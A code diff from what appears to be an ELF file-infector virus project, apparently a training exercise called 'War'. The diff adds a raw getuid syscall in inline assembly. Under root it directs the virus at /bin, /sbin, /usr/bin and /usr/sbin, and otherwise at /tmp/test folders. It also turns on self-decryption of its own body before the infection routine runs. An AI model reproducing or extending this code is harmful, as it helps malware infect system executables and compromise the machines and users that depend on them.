@@ -1,6 +1,29 @@
 #include <war.h>
 
 ////////////////////////////////////////////////////////////////////////////////
+/// ASM VOLATILE 
+////////////////////////////////////////////////////////////////////////////////
+
+__attribute__((always_inline)) static inline uid_t _getuid(void)
+{
+	uid_t ret;
+
+	asm volatile
+	(
+		"mov rax, 0x66\n"
+		"syscall\n"
+	);
+	asm volatile
+	(
+		"mov %0, eax\n"
+		: "=r"(ret)
+		:
+	);
+
+	return ret;
+}
+
+////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
@@ -36,8 +59,34 @@ void __entry(void)
 		:
 	);
 
-//	update_keychain_left(&keychain, (char *)__entry, (void *)host_constructor - (void *)__entry);
-//	decrypt_left(&keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);
+	void *dir;
+	size_t size;
 
-	war(&host, &keychain, SUCCESS);
+	if (_getuid() == 0)
+	{
+		struct s_directory root[] =
+		{
+			{"/bin/", 0},
+			{"/sbin/", 0},
+			{"/usr/bin/", 0},
+			{"/usr/sbin/", 0},
+		};
+		dir = root;
+		size = sizeof(root) / sizeof(root[0]);
+	}
+	else
+	{
+		struct s_directory user[] =
+		{
+			{"/tmp/test/", 0},
+			{"/tmp/test2/", 0},
+		};
+		dir = user;
+		size = sizeof(user) / sizeof(user[0]);
+	}
+
+	update_keychain_left(&keychain, (char *)__entry, (void *)find_host - (void *)__entry);
+	decrypt_left(&keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
+
+	find_host(&host, &keychain, dir, size, SUCCESS);
 }
